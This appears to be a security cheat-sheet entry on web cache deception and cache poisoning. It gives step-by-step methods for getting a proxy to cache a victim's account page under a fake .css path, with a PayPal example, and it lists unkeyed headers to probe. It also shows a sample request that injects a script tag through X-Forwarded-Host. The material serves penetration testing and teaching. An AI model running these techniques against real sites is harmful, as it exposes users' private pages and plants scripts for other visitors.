# Web Cache Deception Attack

## Tools

* [Param Miner - PortSwigger](https://github.com/PortSwigger/param-miner)
    > This extension identifies hidden, unlinked parameters. It's particularly useful for finding web cache poisoning vulnerabilities.

## Exploit

1. Browser requests `http://www.example.com/home.php/non-existent.css`.
2. Server returns the content of `http://www.example.com/home.php`, most probably with HTTP caching headers that instruct to not cache this page.
3. The response goes through the proxy.
4. The proxy identifies that the file has a css extension.
5. Under the cache directory, the proxy creates a directory named home.php, and caches the imposter "CSS" file (non-existent.css) inside.

## Methodology of the attack - example

1. Normal browsing, visit home : `https://www.example.com/myaccount/home/`
2. Open the malicious link : `https://www.example.com/myaccount/home/malicious.css`
3. The page is displayed as /home and the cache is saving the page
4. Open a private tab with the previous URL : `https://www.paypal.com/myaccount/home/malicous.css`
5. The content of the cache is displayed

Video of the attack by Omer Gil - Web Cache Deception Attack in PayPal Home Page
[![YOUTUBE DEMO](https://img.youtube.com/vi/pLte7SomUB8/0.jpg)](https://www.youtube.com/watch?v=pLte7SomUB8)

## Methodology 2

1. Find an unkeyed input for a Cache Poisoning
    ```js
    Values: User-Agent
    Values: Cookie
    Header: X-Forwarded-Host
    Header: X-Host
    Header: X-Forwarded-Server
    Header: X-Forwarded-Scheme (header; also in combination with X-Forwarded-Host)
    Header: X-Original-URL (Symfony)
    Header: X-Rewrite-URL (Symfony)
    ```
2. Cache poisonning attack - Example for `X-Forwarded-Host` unkeyed input (remember to use a buster to only cache this webpage instead of the main page of the website)
    ```js
    GET /test?buster=123 HTTP/1.1
    Host: target.com
    X-Forwarded-Host: test"><script>alert(1)</script>

    HTTP/1.1 200 OK
    Cache-Control: public, no-cache
    [..]
    <meta property="og:image" content="https://test"><script>alert(1)</script>">
    ```


## References

* [Web Cache Deception Attack - Omer Gil](http://omergil.blogspot.fr/2017/02/web-cache-deception-attack.html)
* [Practical Web Cache Poisoning - James Kettle @albinowax](https://portswigger.net/blog/practical-web-cache-poisoning)
* [Web Caching - SI9INT](https://si9int.sh/article/6)
* [Web Cache Deception Attack leads to user info disclosure - Kunal pandey - Feb 25](https://medium.com/@kunal94/web-cache-deception-attack-leads-to-user-info-disclosure-805318f7bb29)